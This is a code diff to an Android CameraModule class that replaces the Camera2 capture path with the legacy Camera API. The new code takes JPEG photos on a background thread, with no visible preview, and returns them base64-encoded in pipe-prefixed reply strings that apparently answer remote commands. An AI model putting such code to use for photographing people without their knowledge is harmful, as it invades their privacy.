@@ -5,39 +5,17 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
-import android.graphics.ImageFormat;
-import android.graphics.YuvImage;
 import android.hardware.Camera;
-import android.hardware.camera2.CameraAccessException;
-import android.hardware.camera2.CameraCaptureSession;
-import android.hardware.camera2.CameraCharacteristics;
-import android.hardware.camera2.CameraDevice;
-import android.hardware.camera2.CameraManager;
-import android.hardware.camera2.CaptureRequest;
-import android.hardware.camera2.TotalCaptureResult;
-import android.hardware.camera2.params.StreamConfigurationMap;
-import android.media.Image;
-import android.media.ImageReader;
 import android.os.Build;
 import android.os.Handler;
-import android.os.HandlerThread;
 import android.os.Looper;
 import android.util.Base64;
 import android.util.Log;
-import android.util.Size;
-import android.view.Surface;
 
-import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 
 import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.nio.ByteBuffer;
-import java.util.ArrayList;
-import java.util.Collections;
-import java.util.List;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicReference;
@@ -47,10 +25,9 @@ public class CameraModule {
     private static final int CAMERA_TIMEOUT_MS = 10000; // 10 seconds
     
     private Context context;
-    private CameraManager cameraManager;
-    private String currentCameraId;
-    private String backCameraId;
-    private String frontCameraId;
+    private int backCameraId = -1;
+    private int frontCameraId = -1;
+    private int currentCameraId = -1;
     private boolean isFrontCamera = false;
     private Handler mainHandler;
     
@@ -61,41 +38,35 @@ public class CameraModule {
     
     public CameraModule(Context context) {
         this.context = context;
-        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
         this.mainHandler = new Handler(Looper.getMainLooper());
         initCameras();
     }
     
     private void initCameras() {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                for (String id : cameraManager.getCameraIdList()) {
-                    CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
-                    Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
-                    if (facing != null) {
-                        if (facing == CameraCharacteristics.LENS_FACING_BACK) {
-                            backCameraId = id;
-                        } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                            frontCameraId = id;
-                        }
-                    }
-                }
-            } else {
-                // For older Android versions, use Camera API
-                int numberOfCameras = Camera.getNumberOfCameras();
-                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
-                for (int i = 0; i < numberOfCameras; i++) {
-                    Camera.getCameraInfo(i, cameraInfo);
-                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
-                        backCameraId = String.valueOf(i);
-                    } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                        frontCameraId = String.valueOf(i);
-                    }
+            int numberOfCameras = Camera.getNumberOfCameras();
+            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
+            
+            for (int i = 0; i < numberOfCameras; i++) {
+                Camera.getCameraInfo(i, cameraInfo);
+                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
+                    backCameraId = i;
+                    Log.d(TAG, "Found back camera: " + i);
+                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                    frontCameraId = i;
+                    Log.d(TAG, "Found front camera: " + i);
                 }
             }
             
             // Set default to back camera
-            currentCameraId = backCameraId != null ? backCameraId : frontCameraId;
+            if (backCameraId != -1) {
+                currentCameraId = backCameraId;
+                isFrontCamera = false;
+            } else if (frontCameraId != -1) {
+                currentCameraId = frontCameraId;
+                isFrontCamera = true;
+            }
+            
             Log.d(TAG, "Cameras initialized - Back: " + backCameraId + ", Front: " + frontCameraId);
             
         } catch (Exception e) {
@@ -105,8 +76,8 @@ public class CameraModule {
     
     public String switchCamera() {
         try {
-            if (frontCameraId != null && backCameraId != null) {
-                if (currentCameraId != null && currentCameraId.equals(backCameraId)) {
+            if (frontCameraId != -1 && backCameraId != -1) {
+                if (currentCameraId == backCameraId) {
                     currentCameraId = frontCameraId;
                     isFrontCamera = true;
                     return "CAMERA_SWITCH|Front camera activated";
@@ -115,9 +86,9 @@ public class CameraModule {
                     isFrontCamera = false;
                     return "CAMERA_SWITCH|Back camera activated";
                 }
-            } else if (frontCameraId == null && backCameraId != null) {
+            } else if (frontCameraId == -1 && backCameraId != -1) {
                 return "CAMERA_SWITCH|Only back camera available";
-            } else if (backCameraId == null && frontCameraId != null) {
+            } else if (backCameraId == -1 && frontCameraId != -1) {
                 return "CAMERA_SWITCH|Only front camera available";
             }
             return "CAMERA_SWITCH|No camera available";
@@ -129,17 +100,8 @@ public class CameraModule {
     
     public String getCurrentCameraInfo() {
         try {
-            if (currentCameraId != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                    CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
-                    Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
-                    String facing_str = (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) 
-                        ? "FRONT" : "BACK";
-                    return "CAMERA_INFO|Current: " + facing_str;
-                } else {
-                    // For older Android, just return based on stored flag
-                    return "CAMERA_INFO|Current: " + (isFrontCamera ? "FRONT" : "BACK");
-                }
+            if (currentCameraId != -1) {
+                return "CAMERA_INFO|Current: " + (isFrontCamera ? "FRONT" : "BACK");
             }
             return "CAMERA_INFO|No camera selected";
         } catch (Exception e) {
@@ -154,76 +116,91 @@ public class CameraModule {
             return;
         }
         
-        Log.d(TAG, "Taking photo with camera: " + (isFrontCamera ? "FRONT" : "BACK"));
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            takePhotoCamera2(callback);
-        } else {
-            takePhotoCamera1(callback);
+        if (currentCameraId == -1) {
+            callback.onError("ERROR: No camera available");
+            return;
         }
-    }
-    
-    @SuppressWarnings("deprecation")
-    private void takePhotoCamera1(final CameraCallback callback) {
-        try {
-            int cameraId = Integer.parseInt(currentCameraId);
-            
+        
+        Log.d(TAG, "Taking photo with camera: " + (isFrontCamera ? "FRONT" : "BACK") + " (ID: " + currentCameraId + ")");
+        
+        // Run camera operations in a background thread
+        new Thread(() -> {
             Camera camera = null;
             try {
-                camera = Camera.open(cameraId);
+                // Open the camera
+                camera = Camera.open(currentCameraId);
                 Camera.Parameters parameters = camera.getParameters();
                 
                 // Set photo quality
                 parameters.setJpegQuality(95);
                 
+                // Set the best picture size
+                Camera.Size pictureSize = getBestPictureSize(parameters);
+                if (pictureSize != null) {
+                    parameters.setPictureSize(pictureSize.width, pictureSize.height);
+                }
+                
                 // Set focus mode if supported
-                if (parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
+                if (parameters.getSupportedFocusModes() != null && 
+                    parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
                     parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                 }
                 
                 camera.setParameters(parameters);
+                
+                // Start preview (required for auto focus)
                 camera.startPreview();
                 
+                // Small delay for camera to adjust
+                Thread.sleep(500);
+                
+                // Take picture
                 final Semaphore captureSemaphore = new Semaphore(0);
-                final AtomicReference<Exception> captureError = new AtomicReference<>();
                 final AtomicReference<byte[]> imageData = new AtomicReference<>();
+                final AtomicReference<String> errorMsg = new AtomicReference<>();
                 
                 camera.takePicture(null, null, new Camera.PictureCallback() {
                     @Override
-                    public void onPictureTaken(byte[] data, Camera camera) {
-                        try {
-                            Log.d(TAG, "Photo captured, size: " + data.length + " bytes");
-                            imageData.set(data);
-                        } catch (Exception e) {
-                            Log.e(TAG, "Error processing photo", e);
-                            captureError.set(e);
-                        } finally {
-                            if (camera != null) {
-                                camera.stopPreview();
-                                camera.release();
-                            }
-                            captureSemaphore.release();
-                        }
+                    public void onPictureTaken(byte[] data, Camera cam) {
+                        Log.d(TAG, "Photo captured, size: " + data.length + " bytes");
+                        imageData.set(data);
+                        captureSemaphore.release();
                     }
                 });
                 
                 // Wait for capture with timeout
                 if (!captureSemaphore.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
-                    throw new Exception("Camera capture timed out");
+                    errorMsg.set("Camera capture timed out");
                 }
                 
-                if (captureError.get() != null) {
-                    throw captureError.get();
+                // Stop preview and release camera
+                camera.stopPreview();
+                camera.release();
+                camera = null;
+                
+                // Check for errors
+                if (errorMsg.get() != null) {
+                    final String error = errorMsg.get();
+                    mainHandler.post(() -> callback.onError("ERROR: " + error));
+                    return;
                 }
                 
                 byte[] data = imageData.get();
                 if (data == null || data.length == 0) {
-                    throw new Exception("No image data received");
+                    mainHandler.post(() -> callback.onError("ERROR: No image data received"));
+                    return;
                 }
                 
+                // Convert to base64
                 String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
+                
+                // Return result on main thread
                 mainHandler.post(() -> callback.onPhotoTaken("CAMERA|data:image/jpeg;base64," + base64Image));
                 
+            } catch (Exception e) {
+                Log.e(TAG, "Camera capture failed", e);
+                final String errorMsg = e.getMessage();
+                mainHandler.post(() -> callback.onError("ERROR: " + (errorMsg != null ? errorMsg : "Unknown error")));
             } finally {
                 if (camera != null) {
                     try {
@@ -233,141 +210,23 @@ public class CameraModule {
                     }
                 }
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Camera1 capture failed", e);
-            mainHandler.post(() -> callback.onError("ERROR: " + e.getMessage()));
-        }
+        }).start();
     }
     
-    private void takePhotoCamera2(final CameraCallback callback) {
-        HandlerThread cameraThread = new HandlerThread("CameraThread");
-        cameraThread.start();
-        Handler cameraHandler = new Handler(cameraThread.getLooper());
+    private Camera.Size getBestPictureSize(Camera.Parameters parameters) {
+        if (parameters.getSupportedPictureSizes() == null) return null;
         
-        final Semaphore lock = new Semaphore(0);
-        final AtomicReference<Exception> error = new AtomicReference<>();
-        final AtomicReference<byte[]> imageData = new AtomicReference<>();
+        Camera.Size bestSize = null;
+        int targetWidth = 1920; // Target 1080p
         
-        try {
-            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
-                @Override
-                public void onOpened(@NonNull CameraDevice camera) {
-                    try {
-                        // Get camera characteristics for orientation
-                        CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
-                        Integer sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION);
-                        
-                        // Create ImageReader
-                        ImageReader reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);
-                        
-                        reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
-                            @Override
-                            public void onImageAvailable(ImageReader reader) {
-                                try (Image image = reader.acquireLatestImage()) {
-                                    if (image != null) {
-                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                                        byte[] bytes = new byte[buffer.remaining()];
-                                        buffer.get(bytes);
-                                        imageData.set(bytes);
-                                        Log.d(TAG, "Photo captured, size: " + bytes.length + " bytes");
-                                    }
-                                } catch (Exception e) {
-                                    Log.e(TAG, "Error acquiring image", e);
-                                    error.set(e);
-                                } finally {
-                                    camera.close();
-                                    lock.release();
-                                }
-                            }
-                        }, cameraHandler);
-                        
-                        // Create capture request
-                        List<Surface> surfaces = new ArrayList<>();
-                        surfaces.add(reader.getSurface());
-                        
-                        camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
-                            @Override
-                            public void onConfigured(@NonNull CameraCaptureSession session) {
-                                try {
-                                    CaptureRequest.Builder builder = camera.createCaptureRequest(
-                                            CameraDevice.TEMPLATE_STILL_CAPTURE);
-                                    builder.addTarget(reader.getSurface());
-                                    builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
-                                    
-                                    if (sensorOrientation != null) {
-                                        builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation);
-                                    }
-                                    
-                                    session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
-                                        @Override
-                                        public void onCaptureCompleted(@NonNull CameraCaptureSession session, 
-                                                                      @NonNull CaptureRequest request, 
-                                                                      @NonNull TotalCaptureResult result) {
-                                            // Capture completed
-                                        }
-                                    }, cameraHandler);
-                                } catch (CameraAccessException e) {
-                                    Log.e(TAG, "Error capturing", e);
-                                    error.set(e);
-                                    camera.close();
-                                    lock.release();
-                                }
-                            }
-                            
-                            @Override
-                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
-                                error.set(new Exception("Session configuration failed"));
-                                camera.close();
-                                lock.release();
-                            }
-                        }, cameraHandler);
-                        
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error opening camera", e);
-                        error.set(e);
-                        camera.close();
-                        lock.release();
-                    }
-                }
-                
-                @Override
-                public void onDisconnected(@NonNull CameraDevice camera) {
-                    error.set(new Exception("Camera disconnected"));
-                    camera.close();
-                    lock.release();
-                }
-                
-                @Override
-                public void onError(@NonNull CameraDevice camera, int errorCode) {
-                    error.set(new Exception("Camera error: " + errorCode));
-                    camera.close();
-                    lock.release();
-                }
-            }, cameraHandler);
-            
-            // Wait for capture to complete
-            if (!lock.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
-                throw new Exception("Camera operation timed out");
+        for (Camera.Size size : parameters.getSupportedPictureSizes()) {
+            if (bestSize == null) {
+                bestSize = size;
+            } else if (Math.abs(size.width - targetWidth) < Math.abs(bestSize.width - targetWidth)) {
+                bestSize = size;
             }
-            
-            if (error.get() != null) {
-                throw error.get();
-            }
-            
-            byte[] data = imageData.get();
-            if (data == null || data.length == 0) {
-                throw new Exception("No image data received");
-            }
-            
-            String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
-            mainHandler.post(() -> callback.onPhotoTaken("CAMERA|data:image/jpeg;base64," + base64Image));
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Camera2 capture failed", e);
-            mainHandler.post(() -> callback.onError("ERROR: " + e.getMessage()));
-        } finally {
-            cameraThread.quitSafely();
         }
+        return bestSize;
     }
     
     private boolean checkPermission() {
@@ -376,6 +235,6 @@ public class CameraModule {
     }
     
     public void cleanup() {
-        // Nothing specific to clean up since we release camera in each operation
+        // Nothing to clean up
     }
 }
